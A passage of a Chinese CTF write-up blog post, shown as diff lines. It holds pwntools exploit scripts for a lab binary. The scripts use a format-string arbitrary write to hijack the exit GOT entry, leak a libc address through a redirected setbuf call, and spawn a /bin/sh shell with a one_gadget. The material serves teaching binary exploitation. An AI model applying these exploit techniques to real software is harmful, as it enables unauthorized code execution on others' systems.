+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;再者，若想重新执行main()或start()，同时无法利用ret，那我们得分析我们现在有的能力</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时，我们有的是向任意地址写入任意长度的字符串的能力</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;那么，我们可以将exit()函数的got表值改为main()或start()的got表值，这样每次执行exit()时其实是在执行main()或start()</p>
+<p>ok，分析完毕，就从修改exit()的got表重新执行main()或start()开始</p>
+<h5 id="重执main-函数或start-函数"><a href="#重执main-函数或start-函数" class="headerlink" title="重执main()函数或start()函数"></a>重执main()函数或start()函数</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[:-1]的效果是只取p64里面的前7个字节</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">myelf = ELF(<span class="string">&quot;./bin/chall&quot;</span>)</span><br><span class="line">mylibc = ELF(<span class="string">&quot;./lib/libc.so.6&quot;</span>)</span><br><span class="line">myld = ELF(<span class="string">&quot;./lib/ld-2.31.so&quot;</span>)</span><br><span class="line">myio = process(argv=[myld.path,myelf.path],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : mylibc.path&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aaw</span>(<span class="params">addr,value</span>):</span></span><br><span class="line">    p_size  = <span class="string">b&quot;9$saaabb&quot;</span>+ p64(addr)[:-<span class="number">1</span>]       <span class="comment"># scanf(&quot;%15s&quot;, size); only handle 15 char</span></span><br><span class="line">    myio.sendlineafter(<span class="string">&quot;size: &quot;</span>,p_size)</span><br><span class="line">    myio.sendlineafter(<span class="string">&quot;data: &quot;</span>,value)</span><br><span class="line"></span><br><span class="line">gdb.attach(myio,<span class="string">&quot;b *0x40132b \n c&quot;</span>)  </span><br><span class="line"></span><br><span class="line">payload1 = p64(<span class="number">0x401256</span>)[:-<span class="number">1</span>]    <span class="comment"># return main ,需要注意，任意地址写的时候，要密切关注被写位置是否超范围覆盖。比如这里如果不在最后加[:-1]的话就会将后一个got表项（__ctype_b_loc）写坏。导致再次进main函数后，执行出错</span></span><br><span class="line"><span class="comment"># payload2 = p64(0x401170)[:-1]    # return start </span></span><br><span class="line">aaw(<span class="number">0x404058</span>,payload1)      <span class="comment"># exit_got: 0x404058</span></span><br><span class="line">myio.interactive()</span><br></pre></td></tr></table></figure>
+
+<h5 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用任意地址写能力将 setbuf(stderr, NULL); 修改为 puts(snprintf_got) 。当程序重新执行start()时，执行 setbuf(stderr, NULL); 时实际上在执行puts(snprintf_got)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">myelf = ELF(<span class="string">&quot;./bin/chall&quot;</span>)</span><br><span class="line">mylibc = ELF(<span class="string">&quot;./lib/libc.so.6&quot;</span>)</span><br><span class="line">myld = ELF(<span class="string">&quot;./lib/ld-2.31.so&quot;</span>)</span><br><span class="line">myio = process(argv=[myld.path,myelf.path],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : mylibc.path&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aaw</span>(<span class="params">addr,value</span>):</span></span><br><span class="line">    p_size  = <span class="string">b&quot;9$saaabb&quot;</span>+ p64(addr)[:-<span class="number">1</span>]       <span class="comment"># scanf(&quot;%15s&quot;, size); only handle 15 char</span></span><br><span class="line">    myio.sendlineafter(<span class="string">&quot;size: &quot;</span>,p_size)</span><br><span class="line">    myio.sendlineafter(<span class="string">&quot;data: &quot;</span>,value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(myio,&quot;b *0x40132b \n c&quot;)  # 2nd scanf</span></span><br><span class="line"><span class="comment"># gdb.attach(myio,&quot;b *0x401379 \n c&quot;)  # setbuf</span></span><br><span class="line"></span><br><span class="line">payload1 = p64(<span class="number">0x401256</span>)[:-<span class="number">1</span>]    <span class="comment"># return main</span></span><br><span class="line">aaw(<span class="number">0x404058</span>,payload1)      <span class="comment"># exit_got: 0x404058</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set stderr ,set setbuf_got</span></span><br><span class="line">aaw(<span class="number">0x4040a0</span>,p64(<span class="number">0x404030</span>)[:-<span class="number">1</span>])   <span class="comment"># change: 0x4040a0 —▸ 0x404030 —▸ 0x7f90a4f14d60 (snprintf)</span></span><br><span class="line">aaw(<span class="number">0x40401f</span>,<span class="string">&quot;\x00\xd0\x10\x40\x00\x00\x00\x00&quot;</span>)                    <span class="comment">#  让地址0x404020处为0x4010d0，往前偏移1字节写入</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># to exec setbuf(stderr) = puts(snprintf_got)</span></span><br><span class="line">payload1 = p64(<span class="number">0x401170</span>)[:-<span class="number">1</span>]    <span class="comment"># return start </span></span><br><span class="line">aaw(<span class="number">0x404058</span>,payload1)      <span class="comment"># exit_got: 0x404058</span></span><br><span class="line"></span><br><span class="line">myio.recvline()			<span class="comment"># puts(stdin)</span></span><br><span class="line">myio.recvline()			<span class="comment"># puts(stdout)</span></span><br><span class="line">libc_snprintf = u64(myio.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))		<span class="comment"># puts(snprintf_got)</span></span><br><span class="line">libc_base = libc_snprintf - <span class="number">0x61d60</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">myio.interactive()</span><br></pre></td></tr></table></figure>
+
+<h5 id="调用execve-“-bin-sh”-参数2-参数2"><a href="#调用execve-“-bin-sh”-参数2-参数2" class="headerlink" title="调用execve(“/bin/sh”,参数2,参数2);"></a>调用execve(“/bin/sh”,参数2,参数2);</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ one_gadget ./lib/libc.so.6</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">myelf = ELF(<span class="string">&quot;./bin/chall&quot;</span>)</span><br><span class="line">mylibc = ELF(<span class="string">&quot;./lib/libc.so.6&quot;</span>)</span><br><span class="line">myld = ELF(<span class="string">&quot;./lib/ld-2.31.so&quot;</span>)</span><br><span class="line">myio = process(argv=[myld.path,myelf.path],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : mylibc.path&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aaw</span>(<span class="params">addr,value</span>):</span></span><br><span class="line">    p_size  = <span class="string">b&quot;9$saaabb&quot;</span>+ p64(addr)[:-<span class="number">1</span>]      <span class="comment"># scanf(&quot;%15s&quot;, size); only handle 15 char</span></span><br><span class="line">    myio.sendlineafter(<span class="string">&quot;size: &quot;</span>,p_size)</span><br><span class="line">    myio.sendlineafter(<span class="string">&quot;data: &quot;</span>,value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(myio,&quot;b *0x40132b \n c&quot;)  # 2nd scanf</span></span><br><span class="line"><span class="comment"># gdb.attach(myio,&quot;b *0x401379 \n c&quot;)  # setbuf</span></span><br><span class="line"></span><br><span class="line">payload1 = p64(<span class="number">0x401256</span>)[:-<span class="number">1</span>]    <span class="comment"># return main</span></span><br><span class="line">aaw(<span class="number">0x404058</span>,payload1)      <span class="comment"># exit_got: 0x404058</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set stderr ,set setbuf_got</span></span><br><span class="line">aaw(<span class="number">0x4040a0</span>,p64(<span class="number">0x404030</span>)[:-<span class="number">1</span>])   <span class="comment"># change: 0x4040a0 —▸ 0x404030 —▸ 0x7f90a4f14d60 (snprintf)</span></span><br><span class="line">aaw(<span class="number">0x40401f</span>,<span class="string">&quot;\x00\xd0\x10\x40\x00\x00\x00\x00&quot;</span>)    <span class="comment"># 让地址0x404020处为0x4010d0，往前偏移1字节写入</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># to exec setbuf(stderr) = puts(snprintf_got)</span></span><br><span class="line">payload1 = p64(<span class="number">0x401170</span>)[:-<span class="number">1</span>]    <span class="comment"># return start </span></span><br><span class="line">aaw(<span class="number">0x404058</span>,payload1)      <span class="comment"># exit_got: 0x404058</span></span><br><span class="line"></span><br><span class="line">myio.recvline()	    <span class="comment"># puts(stdin)</span></span><br><span class="line">myio.recvline()	    <span class="comment"># puts(stdout)</span></span><br><span class="line">libc_snprintf = u64(myio.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) <span class="comment"># puts(snprintf_got)</span></span><br><span class="line">libc_base = libc_snprintf - <span class="number">0x61d60</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload1 = p64(libc_base+<span class="number">0xe3b01</span>)[:-<span class="number">1</span>]    <span class="comment"># exec /bin/sh</span></span><br><span class="line">aaw(<span class="number">0x404058</span>,payload1)      <span class="comment"># exit_got: 0x404058</span></span><br><span class="line"></span><br><span class="line">myio.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/09/15/BUUctf/" rel="prev" title="BUUctf">
+                  <i class="fa fa-chevron-left"></i> BUUctf
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xiaoxiaoxy</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
